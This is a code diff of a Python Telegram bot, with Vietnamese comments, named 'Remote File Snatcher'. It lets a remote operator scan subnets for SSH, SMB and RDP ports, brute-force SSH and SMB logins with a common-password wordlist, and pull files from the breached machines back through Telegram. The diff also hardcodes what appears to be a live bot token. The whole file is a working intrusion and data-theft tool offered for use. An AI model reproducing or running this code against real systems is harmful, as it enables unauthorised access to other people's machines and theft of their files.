@@ -1,37 +1,46 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Bot Telegram: Remote File Snatcher
+# Bot Telegram: Remote File Snatcher (Hoàn chỉnh)
 # Tác giả: palofsc
-# Yêu cầu: pip install python-telegram-bot paramiko impacket
+# Token: 8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY
 
-import asyncio
 import os
+import sys
 import socket
 import ipaddress
 import tempfile
 import threading
 import time
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+import asyncio
+import subprocess
 
-# ---------- THƯ VIỆN TÙY CHỌN ----------
+# ---------- THƯ VIỆN BẮT BUỘC ----------
+try:
+    from telegram import Update
+    from telegram.ext import Application, CommandHandler, ContextTypes
+except ImportError:
+    print("Cài: pip install python-telegram-bot")
+    sys.exit(1)
+
 try:
     import paramiko
-except:
+except ImportError:
     paramiko = None
+    print("Cài: pip install paramiko")
 
 try:
     from impacket.smbconnection import SMBConnection
-except:
+except ImportError:
     SMBConnection = None
+    print("Cài: pip install impacket")
 
 # ---------- CẤU HÌNH ----------
-TOKEN = "YOUR_BOT_TOKEN"  # Thay bằng token của bạn
-WORDLIST = ["admin", "password", "123456", "root", "user", "test", "guest", "P@ssw0rd", "password123"]
+TOKEN = "8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY"
+WORDLIST = ["admin", "password", "123456", "root", "user", "test", "guest", "P@ssw0rd", "password123", "toor", "letmein"]
 TIMEOUT = 2
 SCAN_THREADS = 50
 
-# ---------- CÁC HÀM XỬ LÝ (TÁI SỬ DỤNG) ----------
+# ---------- HÀM QUÉT MẠNG ----------
 def scan_ports(ip, ports):
     open_ports = []
     for port in ports:
@@ -71,9 +80,10 @@ def scan_subnet(subnet, ports=[22, 445, 3389, 139]):
         return str(e)
     return results
 
+# ---------- SSH ----------
 def brute_ssh(ip, username, wordlist=None):
     if paramiko is None:
-        return "Thiếu paramiko"
+        return "LỖI: Thiếu paramiko"
     if wordlist is None:
         wordlist = WORDLIST
     for pwd in wordlist:
@@ -102,9 +112,10 @@ def get_file_ssh(ip, username, password, remote_path, local_path):
     except:
         return False
 
+# ---------- SMB ----------
 def brute_smb(ip, username="", wordlist=None):
     if SMBConnection is None:
-        return "Thiếu impacket"
+        return "LỖI: Thiếu impacket"
     if wordlist is None:
         wordlist = WORDLIST
     users = [username] if username else ["", "guest", "admin", "Administrator"]
@@ -144,23 +155,22 @@ def get_file_smb(ip, username, password, remote_path, local_path):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 Remote File Snatcher Bot\n\n"
-        "Các lệnh:\n"
-        "/scan <subnet> - Quét mạng (vd: /scan 192.168.1.0/24)\n"
-        "/brutessh <ip> <username> - Brute SSH\n"
-        "/getssh <ip> <username> <password> <remote_path> - Tải file SSH\n"
-        "/brutesmb <ip> - Brute SMB\n"
-        "/getsmb <ip> <username> <password> <share/path> - Tải file SMB\n"
-        "/help - Hiển thị trợ giúp"
+        "Lệnh:\n"
+        "/scan <subnet> – Quét mạng (vd: /scan 192.168.1.0/24)\n"
+        "/brutessh <ip> <username> – Brute SSH\n"
+        "/getssh <ip> <user> <pass> <path> – Tải file SSH\n"
+        "/brutesmb <ip> – Brute SMB\n"
+        "/getsmb <ip> <user> <pass> <share/path> – Tải file SMB\n"
+        "/help – Trợ giúp"
     )
 
 async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
-        await update.message.reply_text("Thiếu subnet. Ví dụ: /scan 192.168.1.0/24")
+        await update.message.reply_text("Thiếu subnet. VD: /scan 192.168.1.0/24")
         return
     subnet = args[0]
-    await update.message.reply_text(f"⏳ Đang quét {subnet} ... (có thể mất vài phút)")
-    # Chạy trong thread riêng
+    await update.message.reply_text(f"⏳ Đang quét {subnet} ... (mất vài phút)")
     loop = asyncio.get_event_loop()
     result = await loop.run_in_executor(None, scan_subnet, subnet)
     if isinstance(result, str):
@@ -169,9 +179,9 @@ async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not result:
         await update.message.reply_text("Không tìm thấy máy nào.")
         return
-    msg = "Kết quả quét:\n"
+    msg = "📡 Kết quả quét:\n"
     for ip, ports in result:
-        msg += f"{ip} - Mở: {ports}\n"
+        msg += f"✅ {ip} - Mở: {ports}\n"
         if len(msg) > 4000:
             await update.message.reply_text(msg)
             msg = ""
@@ -184,24 +194,23 @@ async def brutessh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Cú pháp: /brutessh <ip> <username>")
         return
     ip, username = args[0], args[1]
-    await update.message.reply_text(f"⏳ Đang brute SSH {ip} với user {username} ...")
+    await update.message.reply_text(f"⏳ Brute SSH {ip}:{username} ...")
     loop = asyncio.get_event_loop()
     pwd = await loop.run_in_executor(None, brute_ssh, ip, username)
-    if pwd:
-        await update.message.reply_text(f"✅ Tìm thấy mật khẩu: `{pwd}`", parse_mode="Markdown")
+    if pwd and pwd != "LỖI: Thiếu paramiko":
+        await update.message.reply_text(f"✅ Mật khẩu: `{pwd}`", parse_mode="Markdown")
     else:
-        await update.message.reply_text("❌ Không tìm thấy mật khẩu.")
+        await update.message.reply_text(f"❌ Không tìm thấy. {pwd if pwd else ''}")
 
 async def getssh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 4:
-        await update.message.reply_text("Cú pháp: /getssh <ip> <username> <password> <remote_path>")
+        await update.message.reply_text("Cú pháp: /getssh <ip> <user> <pass> <remote_path>")
         return
     ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
-    # Tạo file tạm
     with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
         local = tmp.name
-    await update.message.reply_text(f"⏳ Đang tải {remote} từ {ip} ...")
+    await update.message.reply_text(f"⏳ Đang tải {remote} ...")
     loop = asyncio.get_event_loop()
     success = await loop.run_in_executor(None, get_file_ssh, ip, user, pwd, remote, local)
     if success:
@@ -209,7 +218,7 @@ async def getssh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_document(document=f, filename=os.path.basename(remote))
         os.unlink(local)
     else:
-        await update.message.reply_text("❌ Tải file thất bại.")
+        await update.message.reply_text("❌ Tải thất bại.")
         if os.path.exists(local):
             os.unlink(local)
 
@@ -219,24 +228,24 @@ async def brutesmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Cú pháp: /brutesmb <ip>")
         return
     ip = args[0]
-    await update.message.reply_text(f"⏳ Đang brute SMB {ip} ...")
+    await update.message.reply_text(f"⏳ Brute SMB {ip} ...")
     loop = asyncio.get_event_loop()
     cred = await loop.run_in_executor(None, brute_smb, ip)
-    if cred:
+    if cred and cred != "LỖI: Thiếu impacket":
         user, pwd = cred
-        await update.message.reply_text(f"✅ Tìm thấy: {user}:{pwd}")
+        await update.message.reply_text(f"✅ Tìm thấy: `{user}:{pwd}`", parse_mode="Markdown")
     else:
-        await update.message.reply_text("❌ Không tìm thấy.")
+        await update.message.reply_text(f"❌ Không tìm thấy. {cred if cred else ''}")
 
 async def getsmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 4:
-        await update.message.reply_text("Cú pháp: /getsmb <ip> <username> <password> <share/path>")
+        await update.message.reply_text("Cú pháp: /getsmb <ip> <user> <pass> <share/path>")
         return
     ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
     with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
         local = tmp.name
-    await update.message.reply_text(f"⏳ Đang tải {remote} từ {ip} ...")
+    await update.message.reply_text(f"⏳ Đang tải {remote} ...")
     loop = asyncio.get_event_loop()
     success = await loop.run_in_executor(None, get_file_smb, ip, user, pwd, remote, local)
     if success:
@@ -244,21 +253,26 @@ async def getsmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_document(document=f, filename=os.path.basename(remote))
         os.unlink(local)
     else:
-        await update.message.reply_text("❌ Tải file thất bại.")
+        await update.message.reply_text("❌ Tải thất bại.")
         if os.path.exists(local):
             os.unlink(local)
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await start(update, context)
 
-# ---------- MAIN ----------
+# ---------- KHỞI CHẠY ----------
 def main():
     if TOKEN == "YOUR_BOT_TOKEN":
-        print("⚠️ Vui lòng đặt TOKEN bot vào biến TOKEN")
+        print("Chưa set token.")
         return
 
-    app = Application.builder().token(TOKEN).build()
+    # Kiểm tra thư viện
+    if paramiko is None:
+        print("⚠️ paramiko chưa cài -> SSH không dùng được.")
+    if SMBConnection is None:
+        print("⚠️ impacket chưa cài -> SMB không dùng được.")
 
+    app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_cmd))
     app.add_handler(CommandHandler("scan", scan_cmd))
@@ -267,7 +281,7 @@ def main():
     app.add_handler(CommandHandler("brutesmb", brutesmb_cmd))
     app.add_handler(CommandHandler("getsmb", getsmb_cmd))
 
-    print("🤖 Bot đang chạy...")
+    print("🤖 Bot đang chạy... (polling)")
     app.run_polling()
 
 if __name__ == "__main__":
